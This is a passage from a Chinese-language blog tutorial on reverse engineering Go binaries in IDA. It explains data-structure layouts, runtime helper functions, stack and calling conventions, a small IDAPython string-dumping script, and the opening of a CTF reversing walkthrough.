class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> StringHeader <span class="hljs-keyword">struct</span>&#123;<br>Data <span class="hljs-type">uintptr</span> <span class="hljs-comment">//字符串首地址</span><br>Len <span class="hljs-type">int</span>  <span class="hljs-comment">//字符串长度</span><br>&#125;<br></code></pre></td></tr></table></figure><p>字符串的大小由存储字符串长度的字段决定，程序通过访问字符串指针字段来使用字符串。</p><p>在逆向中重点关注的是如上结构，因此说一个<code>string</code>对象占两个字长，其它结构也按这种约定。</p><p>例如输出一个字符串，它会将上述结构入栈，由于没有终止符 IDA 无法正常识别字符串结束符因此输出了很多信息，我们需要依靠它的第二个域决定它的结束位置：</p><ul><li>字符串拼接</li></ul><p>字符串的常见操作是字符串拼接，若拼接的字符串个数不超过 5，则调用<code>concatstringN</code>，否则会调用<code>concatstrings</code>，函数声明如下，可见在多个字符串拼接时参数形式不同：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 两个字符串拼接</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">concatstring2</span><span class="hljs-params">(*[32]<span class="hljs-type">byte</span>,<span class="hljs-type">string</span>,<span class="hljs-type">string</span>)</span></span><span class="hljs-type">string</span><br><span class="hljs-comment">// 三个字符串拼接，依此类推</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">concatstring3</span><span class="hljs-params">(*[32]<span class="hljs-type">byte</span>,<span class="hljs-type">string</span>,<span class="hljs-type">string</span>,<span class="hljs-type">string</span>)</span></span><span class="hljs-type">string</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">concatstring4</span><span class="hljs-params">(*[32]<span class="hljs-type">byte</span>,<span class="hljs-type">string</span>,<span class="hljs-type">string</span>,<span class="hljs-type">string</span>)</span></span><span class="hljs-type">string</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">concatstring5</span><span class="hljs-params">(*[32]<span class="hljs-type">byte</span>,<span class="hljs-type">string</span>,<span class="hljs-type">string</span>,<span class="hljs-type">string</span>,<span class="hljs-type">string</span>)</span></span><span class="hljs-type">string</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">concatstrings</span><span class="hljs-params">(*[32]<span class="hljs-type">byte</span>,[]<span class="hljs-type">string</span>)</span></span><span class="hljs-type">string</span><br></code></pre></td></tr></table></figure><p>因此在遇到<code>concatstringN</code>时可以跳过第一个参数，随后入栈的参数即为字符串，而遇到<code>concatstringN</code>时，跳过第一个参数后汇编层面还剩三个参数，其它后两个一般相同且指明字符串个数，第一个参数则指明字符串数组的首地址。</p><p><img src="/assets/Pasted%20image%2020250108093459.png"></p><h3 id="array"><a href="#array" class="headerlink" title="array"></a>array</h3><p>类似 C 把字符串看作 char 数组，array 和 string 的结构类似，其真实数据也是在内存里连续存放，而使用如下结构索引数据，对数组里的元素访问其地址偏移在编译时就能确定，总之逆向角度看它也是占两个字长：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> arrayHeader <span class="hljs-keyword">struct</span>&#123;<br>Data <span class="hljs-type">uintptr</span> <span class="hljs-comment">//首元素地址</span><br>Len <span class="hljs-type">int</span> <span class="hljs-comment">//数组长度</span><br>&#125;<br></code></pre></td></tr></table></figure><p>数组有三种存储位置，当数组内元素较少时可以直接存于栈上，较多时存于数据区，而当数据会被返回时会存于堆上。如下定义了三个局部变量，但是它们将在底层表现出不同的形态：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Getarray</span><span class="hljs-params">()</span></span> *[<span class="hljs-number">3</span>]<span class="hljs-type">int</span> &#123;<br>a:=[...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;<br>b:=[...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>&#125;<br>c:=[...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)&lt;<span class="hljs-built_in">len</span>(b)&#123;<br><span class="hljs-keyword">return</span> &amp;c<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>变量 a 的汇编如下，它直接在栈上定义并初始化：</p><p><img src="/assets/Pasted%20image%2020250403005153.png"></p><p>变量 b 的汇编如下，它的初始值被定义在了数据段</p><p>其中loc_4668a6 是数据拷贝函数，若符号信息完整遇到无法识别出的函数一般也就是数据拷贝函数。</p><p>变量 c 的汇编如下，尽管它和a的值一样，但是 Go 作为内存安全的语言，其通过runtime.newobject在堆上申请空间来释放该对象，返回的是新的对象指针。</p><p>golang的返回值通过栈传递</p><h3 id="slice"><a href="#slice" class="headerlink" title="slice"></a>slice</h3><p>类似数组，切片的实例对象数据结构如下，可知它占用了三个字长，与它相关的函数是<code>growslice</code>，表示扩容，逆向时可忽略：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> SliceHeader <span class="hljs-keyword">struct</span> &#123;<br>Data <span class="hljs-type">uintptr</span> <span class="hljs-comment">//数据指针</span><br>Len  <span class="hljs-type">int</span>     <span class="hljs-comment">//当前长度</span><br>Cap  <span class="hljs-type">int</span>     <span class="hljs-comment">//可容纳的长度</span><br>&#125;<br></code></pre></td></tr></table></figure><p>更常见的函数是与字符串相关的转换，它们在底层调用的是如下函数，此处我们依然不必关注第一个参数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">slicebytetostring</span><span class="hljs-params">(buf*[32]<span class="hljs-type">byte</span>, ptr *<span class="hljs-type">byte</span>, n <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">string</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">stringtoslicebyte</span><span class="hljs-params">(*[32]<span class="hljs-type">byte</span>, <span class="hljs-type">string</span>)</span></span> []<span class="hljs-type">byte</span><br></code></pre></td></tr></table></figure><ul><li>例</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">var</span> a <span class="hljs-type">string</span> = <span class="hljs-string">&quot;hello world&quot;</span><br><span class="hljs-keyword">var</span> b []<span class="hljs-type">byte</span> = []<span class="hljs-type">byte</span>(a)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><p>字典实现比较复杂，不过在逆向中会涉及到的内容很简单，字典操作常见的会转换为如下函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">fastrand</span><span class="hljs-params">()</span></span> <span class="hljs-type">uint32</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">makemap</span><span class="hljs-params">(mapType *<span class="hljs-type">byte</span>, hint <span class="hljs-type">int</span>, mapbuf *any)</span></span> (hmap <span class="hljs-keyword">map</span>[any]any)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">mapaccess1</span><span class="hljs-params">(mapType *<span class="hljs-type">byte</span>, hmap <span class="hljs-keyword">map</span>[any]any, key *any)</span></span> (val *any)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">mapaccess2</span><span class="hljs-params">(mapType *<span class="hljs-type">byte</span>, hmap <span class="hljs-keyword">map</span>[any]any, key *any)</span></span> (val *any, pres <span class="hljs-type">bool</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">mapassign</span><span class="hljs-params">(mapType *<span class="hljs-type">byte</span>, hmap <span class="hljs-keyword">map</span>[any]any, key *any)</span></span> (val *any)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">mapiterinit</span><span class="hljs-params">(mapType *<span class="hljs-type">byte</span>, hmap <span class="hljs-keyword">map</span>[any]any, hiter *any)</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">mapiternext</span><span class="hljs-params">(hiter *any)</span></span><br></code></pre></td></tr></table></figure><ul><li>创建：一般<code>fastrand</code>和<code>makemap</code>连用返回一个<code>map</code>指针。</li><li>读取：读字典时使用<code>mapaccess1</code>和<code>mapaccess2</code>。</li><li>写入：写字典时会使用<code>mapassign</code>函数，它返回一个地址，将<code>value</code>写入该地址。</li></ul><p>另外比较常见的是对字典进行遍历，会使用<code>mapiterinit</code>和<code>mapiternext</code>配合。</p><p>事实上更常见的是上面这些函数的同类函数，它们的后缀代表了对特定类型的优化，例如如下代码：</p><ul><li>例</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>a := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<br><span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">1</span>,<br><span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">32</span>,<br>&#125;<br>a[<span class="hljs-string">&quot;age&quot;</span>] = <span class="hljs-number">19</span><br>fmt.Println(a[<span class="hljs-string">&quot;id&quot;</span>])<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h3><p>类似 C 语言，Go 的结构体也是由其它类型组成的符号结构，它里面域的顺序也是定义的顺序，里面的数据对齐规则和 C 一致不过我们可以直接从其类型信息获得，不必自己算。在分析结构体变量时必须要了解结构体的类型结构了，其定义如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> rtype <span class="hljs-keyword">struct</span>&#123;<br>size      <span class="hljs-type">uintptr</span>  <span class="hljs-comment">//该类型对象实例的大小</span><br>ptrdata   <span class="hljs-type">uintptr</span>  <span class="hljs-comment">//rtype 可以包含指针的字节数</span><br>hash      <span class="hljs-type">uint32</span>   <span class="hljs-comment">//rtype 哈希值：避免哈希表中的计算</span><br>tflag     tflag    <span class="hljs-comment">//额外的类型信息标识</span><br>align     <span class="hljs-type">uint8</span>    <span class="hljs-comment">//当前具体类型变量的内存对齐</span><br>kind      <span class="hljs-type">uint8</span>    <span class="hljs-comment">//具体 kind 的枚举值</span><br>alg       *typeAlg <span class="hljs-comment">//算法表</span><br>gcdata    *<span class="hljs-type">byte</span>    <span class="hljs-comment">//垃圾回收数据</span><br>str       nameoff  <span class="hljs-comment">//字符串格式</span><br>ptrToThis typeoff  <span class="hljs-comment">//指向该类型的指针 </span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> structField <span class="hljs-keyword">struct</span> &#123;<br>name        name    <span class="hljs-comment">//属性名称</span><br>typ         *rtype  <span class="hljs-comment">//该域的类型</span><br>offsetEmbed <span class="hljs-type">uintptr</span> <span class="hljs-comment">//offsetEmbed&gt;&gt;1 得到该属性在对象中的偏移</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> structType <span class="hljs-keyword">struct</span> &#123;<br>typ     _type<br>pkgPath name           <span class="hljs-comment">//包名</span><br>fields  []structField  <span class="hljs-comment">//域数组</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> uncommonType <span class="hljs-keyword">struct</span>&#123;<br>pkgPath nameoff <span class="hljs-comment">//包路径</span><br>mcount  <span class="hljs-type">uint16</span>  <span class="hljs-comment">//方法数</span><br>xcount  <span class="hljs-type">uint16</span>  <span class="hljs-comment">//导出的方法数</span><br>moff    <span class="hljs-type">uint32</span>  <span class="hljs-comment">//方法数组的偏移</span><br>-       <span class="hljs-type">uint32</span>  <span class="hljs-comment">//unused</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> structTypeUncommon <span class="hljs-keyword">struct</span> &#123;<br>structType<br>u uncommonType<br>&#125;<br></code></pre></td></tr></table></figure><p>如下为 macaron 的 Context 结构体的类型信息，可见它的实例对象占了 0x90 字节，这实际上会和下面 fields 中对象所占空间对应：</p><h2 id="语法特性"><a href="#语法特性" class="headerlink" title="语法特性"></a>语法特性</h2><h3 id="新建对象"><a href="#新建对象" class="headerlink" title="新建对象"></a>新建对象</h3><p>Go 不是面向对象的语言，此处将 Go 的变量当作对象来描述。</p><p>动态创建时会在堆区创建对象，这里涉及<code>make</code>和<code>new</code>两个关键词，不过在汇编层面它们分别对应着<code>makechan</code>、<code>makemap</code>、<code>makeslice</code>与<code>newobject</code>，如<code>makeslice</code>，它的定义如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">makeslice</span><span class="hljs-params">(et *_type,<span class="hljs-built_in">len</span>,<span class="hljs-built_in">cap</span> <span class="hljs-type">int</span>)</span></span> unsafe.Pointer<br></code></pre></td></tr></table></figure><ul><li>例</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>a := <span class="hljs-built_in">make</span>([]<span class="hljs-type">uint8</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>调用<code>make([]uint8,5,10)</code>创建一个<code>slice</code>后，会生成此代码：</p><p><img src="/assets/Pasted%20image%2020250108113935.png"></p><h3 id="函数与方法"><a href="#函数与方法" class="headerlink" title="函数与方法"></a>函数与方法</h3><ul><li>栈空间</li></ul><p>栈可以分为两个区域，在栈底部存放局部变量，栈顶部做函数调用相关的参数与返回值传递。</p><p>因此在分析时不能对顶部的<code>var</code>命名，因为它不特质某具体变量而是随时在变化的，错误的命名容易造成混淆，如下图，0xE60 距 0xEC0 足够远，因此此处很大概率是局部变量可重命名，而 0xEB8 距栈顶很近，很大改了是用于传参的，不要重命名：</p><p><img src="/assets/Pasted%20image%2020250417142443.png"></p><ul><li>可变参数</li></ul><p>类似 Python 的一般变参实际被转化为一个 tuple，Go 变参也被转换为了一个 slice。因此一个变参在汇编级别占 3 个 参数位，如下代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">VarArgDemo</span><span class="hljs-params">(args ...<span class="hljs-type">int</span>)</span></span>(sum <span class="hljs-type">int</span>)&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>varArgDemo(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>它会被编译为如下形式：</p><p><img src="/assets/Pasted%20image%2020250417142956.png"></p><ul><li>方法</li></ul><p>Go 可以为任意自定义类型绑定方法，方法将会被转换为普通函数，并且将方法的接收者转化为第一个参数，再看看上文结构体的图：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-keyword">type</span> demo <span class="hljs-keyword">struct</span> &#123;<br>size <span class="hljs-type">int</span><br>data <span class="hljs-type">int</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d *demo)</span></span> <span class="hljs-built_in">len</span>() <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">return</span> d.size<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>d := &amp;demo&#123;size: <span class="hljs-number">10</span>, data: <span class="hljs-number">100</span>&#125;<br><br>fmt.Println(<span class="hljs-string">&quot;Size of demo:&quot;</span>, d.<span class="hljs-built_in">len</span>())<br>&#125;<br></code></pre></td></tr></table></figure><p>在逆向时工具会将其解析为<code>类型名__方法名</code>或<code>类型名_方法名</code>，因此遇到此类名称时我们需要注意他的第一个参数是隐含参数，类似 C++ 的<code>this</code>指针，但 Go 的方法定义不仅支持传引用，也支持传值，因此第一个参数可能在汇编层面不只占一个机器字，如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>    name   <span class="hljs-type">string</span><br>    age    <span class="hljs-type">int</span><br>    weight <span class="hljs-type">uint16</span><br>    height <span class="hljs-type">uint16</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p Person)</span></span> Print() &#123;<br>    fmt.Printf(<span class="hljs-string">&quot;%t\n&quot;</span>, p)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Person)</span></span> PPrint() &#123;<br>    fmt.Printf(<span class="hljs-string">&quot;%t\n&quot;</span>, p)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    lihua := Person&#123;<br>        name:   <span class="hljs-string">&quot;lihua&quot;</span>,<br>        age:    <span class="hljs-number">18</span>,<br>        weight: <span class="hljs-number">60</span>,<br>        height: <span class="hljs-number">170</span>,<br>    &#125;<br>    lihua.Print()<br>    lihua.PPrint()<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/assets/Pasted%20image%2020250417150023.png"></p><h3 id="伸缩栈"><a href="#伸缩栈" class="headerlink" title="伸缩栈"></a>伸缩栈</h3><p>由于 Go 可以拥有大量的协程，若使用固定大小的栈将会造成内存空间浪费，因此它使用伸缩栈。</p><p>初始时一个普通携程只分配几 kb 的栈，并在函数执行前先判断栈空间是否足够，若不够则通过一些方式扩展栈，这在汇编上的表现形式如下：</p><p>在调用<code>runtime.morestack*</code>函数扩展栈后会重新进入函数并进入左侧分支，因此在分析时直接忽略右侧分支即可。</p><h3 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h3><p>Go 统一通过栈传递参数和返回值（较新版本可能通过寄存器），这些空间由调用者维护，返回值内存会在调用者前选择性的被初始化。</p><p>参数传递是从左到右顺序，在内存中从下到上写入栈，因此看到<code>mov [rsp+0xXX+var_xx]</code>，<code>reg</code>（栈顶）时就代表开始为函数调用准备参数了，继续向下就能确定函数的参数个数及内容：</p><p>如图，<code>mov [rsp+108h+v_108],rdx</code>，<code>rdx</code>即标识开始向栈上传递第一个参数了，从此处到<code>call</code>指令前都是传参，此处可见在汇编层面传了 3 个参数，<code>call</code>指令之后为返回值，不过可能存在返回值未使用的情况，因此返回值的个数和含义需要从函数内部分析，即分析函数<code>retn</code>指令前的指令来确定返回值大小。</p><h3 id="写屏障"><a href="#写屏障" class="headerlink" title="写屏障"></a>写屏障</h3><p>Go 拥有垃圾回收机制，其三色标记使用了写屏障的方法保证一致性，在垃圾收集过程中会将写屏障标志置位，此时会进入另一条逻辑，但是我们在逆向过程中可以认为该位未置位而直接分析无保护的情况。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">runtime_gcWriteBarrier</span><br></code></pre></td></tr></table></figure><p>先判断标志，再决定是否进入，在分析时可以直接认为其永假并走左侧分支。</p><h3 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h3><p>在代码中使用 go 关键词可以创建并运行协程，它在汇编上会被表现为<code>runtime_newproc(fn,args?)</code>，它会被封装函数与参数并创建携程执行信息，并在适当时候被执行。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">runtime_newproc</span><br></code></pre></td></tr></table></figure><p>这里执行了<code>go loop</code>，由于没有参数此处<code>newproc</code>只被传入了函数指针这一个参数，否则会传入继续传入函数所需的参数，在分析时直接将函数作为在新的线程里执行即可。</p><h3 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h3><p>往往用于资源释放。</p><h2 id="逆向实战"><a href="#逆向实战" class="headerlink" title="逆向实战"></a>逆向实战</h2><p>总结一下，Go 语言逆向的难点主要分为三点：</p><ul><li>独特而复杂的数据类型</li><li>独特的调用约定和栈结构，多返回值机制</li><li>全静态链接构建</li></ul><p>尽管是编译型语言，Go 仍然提供了一定的动态能力，这主要表现在接口与反射上，而这些能力离不开类型系统，它需要保留必要的类型定义以及对象和类型之间的关联，这部分内容无法在二进制文件中被去除，否则会影响重新运行，因此在 Go 逆向时能获取到大量的符号信息，大大简化了逆向的难度，对此类信息已有许多优秀的工具可供使用，例如go_parser与redress。</p><p><img src="/assets/Pasted%20image%2020250405112850.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> idaapi<br><span class="hljs-keyword">import</span> idc<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_strings</span>(<span class="hljs-params">start,end</span>):<br>r=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start,end,<span class="hljs-number">16</span>):<br>addr=idaapi.get_qword(i)<br>size=idaapi.get_qword(i+<span class="hljs-number">8</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(size))<br><span class="hljs-keyword">if</span> size&gt;<span class="hljs-number">100</span>:<br><span class="hljs-keyword">break</span><br>s=idc.get_bytes(addr,size)<br>r.append((i,s))<br><span class="hljs-keyword">return</span> r<br>strings=scan_strings(<span class="hljs-number">0x1c16990</span>,<span class="hljs-number">0x01c19430</span>)<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;strings.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br><span class="hljs-keyword">for</span> i,s <span class="hljs-keyword">in</span> strings:<br>f.write(<span class="hljs-string">&quot;%x:%s\n&quot;</span>%(i,s))<br>f.close()<br></code></pre></td></tr></table></figure><h2 id="符号还原"><a href="#符号还原" class="headerlink" title="符号还原"></a>符号还原</h2><blockquote><p>go_praser符号恢复工具：<a href="https://github.com/0xjiayu/go_parser?tab=readme-ov-file">0xjiayu&#x2F;go_parser: Yet Another Golang binary parser for IDAPro</a></p></blockquote><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><blockquote><p>2024 YLCTF ezgo</p></blockquote><ul><li><p>分析</p></li><li><p>exp</p></li></ul><blockquote><p>2023 安洵杯 gowhere</p></blockquote><blockquote><p>强网拟态 2022 comeongo</p></blockquote><blockquote><p>2024羊城杯 pic</p></blockquote><ul><li>分析</li></ul><p>我们拿到附件，有一个<code>pic.exe</code>文件和一个<code>flag.png</code>文件，<code>flag.png</code>文件应该是加密后的 flag 文件。</p><p><img src="/assets/Pasted%20image%2020250417171222.png"></p><p>运行程序，要求我们输入密钥。</p><p>ida反编译分析，通过字符串定位</p><p><img src="/assets/Pasted%20image%2020250417171307.png"></p><p>这里<code>off_4DD470</code>变量就是输入字符串，我们将它重命名。</p><p><img src="/assets/Pasted%20image%2020250417171317.png"></p><p>根据下面的<code>flag.png</code>字样可以判断，程序应该是对 flag 文件进行加密或解密。</p><p>这里可以猜测<code>p_string</code>变量是接收输入密钥的变量，我们根据逻辑重命名代码。</p><p><img src="/assets/Pasted%20image%2020250417171413.png"></p><p>可以看到密钥在几个变量间传递，并且限制密钥的长度为 5 ，否则便退出。</p><p><img src="/assets/Pasted%20image%2020250417171629.png"></p><p>下面我们观察函数表，发现很明显的反调试函数，以及<code>SeySize</code>和<code>NewCipher</code>的加密相关函数。我们首先分析加密相关的函数。</p><p><img 